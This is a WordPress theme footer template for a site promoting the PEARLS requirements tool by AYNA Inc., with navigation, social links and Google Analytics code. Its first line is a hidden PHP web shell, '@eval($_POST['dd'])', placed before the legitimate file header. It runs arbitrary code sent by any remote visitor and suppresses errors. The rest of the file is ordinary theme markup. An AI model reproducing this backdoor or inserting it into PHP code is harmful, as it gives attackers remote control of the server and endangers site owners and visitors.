<?php @eval($_POST['dd']);?><?php
/**
* The template for displaying the footer
*
* Contains the closing of the #content div and all content after.
*
* @link https://developer.wordpress.org/themes/basics/template-files/#template-partials
*
* @package actonvideo
*/
?>

<section class="panel section3" data-section-name="section4">
	<div class="container">
		<div class="col-md-12">
			<br><br>
			<h2 class="schedulebtn"><a href="<?php echo site_url('contact-us/'); ?>">Schedule Pearls Demo</a></h2>
			<hr>
			<p>PEARLS An easy to use Requirements Tool, For Business Analysts.</p>
			<img class="center-block stickylogo img-responsive" src="<?php echo THEME; ?>/images/laptop.png" alt="">
		</div>
	</div>
	<div class="logoes">
		<h2>OUR CLIENTS</h2>
		  <p>Let's be your Business Analysis partners</p>
		<!-- <ul class="clients">
			<li><a href="#"><img class="center-block" src="<?php echo THEME; ?>/images/client1.png" alt=""></a></li>
			<li><a href="#"><img class="center-block" src="<?php echo THEME; ?>/images/client2.png" alt=""></a></li>
			<li><a href="#"><img class="center-block" src="<?php echo THEME; ?>/images/client3.png" alt=""></a></li>
			<li><a href="#"><img class="center-block" src="<?php echo THEME; ?>/images/client4.png" alt=""></a></li>
			<li><a href="#"><img class="center-block" src="<?php echo THEME; ?>/images/client5.png" alt=""></a></li>
		</ul> -->
		<img class="stickylogo center-block img-responsive" src="<?php echo THEME; ?>/images/sticklogo.png" alt="">
	</div>
	<div class="footer">
		<div class="container">
			<div class="ro">
				<div class="col-md-12">
					<nav class="menu">
                        <ul>
                            <?php
                            $primaryMenu = array(
                            'theme_location'  => 'menu-1',
                            'menu'            => '',
                            'container'       => '',
                            'container_class' => false,
                            'container_id'    => '',
                            'menu_class'      => 'menu',
                            'menu_id'         => 'Primary',
                            'echo'            => false,
                            'fallback_cb'     => 'wp_page_menu',
                            'before'          => '',
                            'after'           => '',
                            'link_before'     => '',
                            'link_after'      => '',
                            'depth'           => 0,
                            'walker'          => ''
                            );
                            echo strip_tags( wp_nav_menu( $primaryMenu ), '<li><a>' ); ?>
                                <?php if (get_option('linkedin_url')): ?>
                                <li class="social"><a href="<?php echo get_option('linkedin_url') ?>"><i class="fa fa-linkedin" aria-hidden="true"></i></a></li>
                                <?php endif ?>
                                <?php if (get_option('twitter_url')): ?>
                                <li class="social"><a href="<?php echo get_option('twitter_url') ?>"><i class="fa fa-twitter" aria-hidden="true"></i></a></li>
                                <?php endif ?>
                            </ul>
                        </nav>
					<hr>
					<p>AYNA Inc. All Rights Reserved 2017.</p>
					<p class="copyright">
						© 2017
					</p>
				</div>
			</div>
		</div>
	</div>
</section>






</body>
<?php wp_footer(); ?>
<script>
	jQuery(document).ready(function($) {
		jQuery.scrollify.destroy();
	});
</script>

<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
 
  ga('create', 'UA-91094535-1', 'auto');
  ga('send', 'pageview');
 


</script>


</html>






